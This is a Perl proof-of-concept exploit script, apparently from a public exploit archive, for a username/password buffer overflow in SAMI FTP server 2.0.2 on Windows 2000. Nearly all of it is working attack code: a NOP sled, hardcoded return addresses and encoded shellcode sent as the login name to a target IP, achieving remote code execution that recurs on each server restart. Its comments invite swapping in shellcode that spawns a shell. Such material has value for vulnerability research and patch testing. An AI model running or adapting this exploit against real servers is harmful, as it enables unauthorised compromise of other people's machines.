#!/usr/bin/perl
#		Exploit for SAMI FTP  version 2.0.2
#		USER/PASS BUFFER OVERFLOW ARBITARY REMOTE CODE EXECUTION (CALC.exe) 
#		You can put you own shellcode to spawn a shell
#		Thrusday 17th  Jan 2007
#		Tested on : Windows 2000 SP4  (Use your own return address for other flavors)		
#		
#				
#		
#		Coded by UmZ! umz32.dll@gmail.com
#		On behalf of : Secure Bytes Inc.
#		http://www.secure-bytes.com/exploits/
#	
#
#	
#	    Special Thanks to Ahmad Tauqeer, Ali Shuja and Uquali
#
#
#	    Disclaimer: This Proof of concept exploit is for educational purpose only.
#		        Please do not use it against any system without prior permission.
#          		You are responsible for yourself for what you do with this code.
#
#
#	    Note:	After executing the exploit You will get "Cannot login User or password not correct."
#			That doesn't mean exploit failed whenever you click on Sami FTP server it will crash 
#			resulting in the execution of calc.exe and will execute whenever the SAMI FTP server 
#			restarts until it is reinstalled.


use Net::FTP;


print "Coded by UmZ! umz32.dll@gmail.com\n";
print "http://www.secure-bytes.com/exploits/\n";
	
$ftp = Net::FTP->new("192.168.100.250", Debug => 0) or die "Cannot connect : $@";

my $msg ="\x90" x596;      #140
my $msg2 ="B"x484;
my $shellcode =  "\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8".
		 "\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1".
		 "\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07".
		 "\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25".
		 "\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5".
		 "\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d".
		 "\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4".
		 "\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0".
		 "\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c".
		 "\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b".
		 "\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4";

my $test= "\x90" x 108;

my $msg1=$msg. "\x70\xFD\x8B\x01"."\x96\x64\xF8\x77". $test .  $shellcode. "\r\n";

$ftp->login($msg1."\r\n\0","umz") or die "Cannot login ", $ftp->message;

$ftp->quit;

# milw0rm.com [2007-01-17]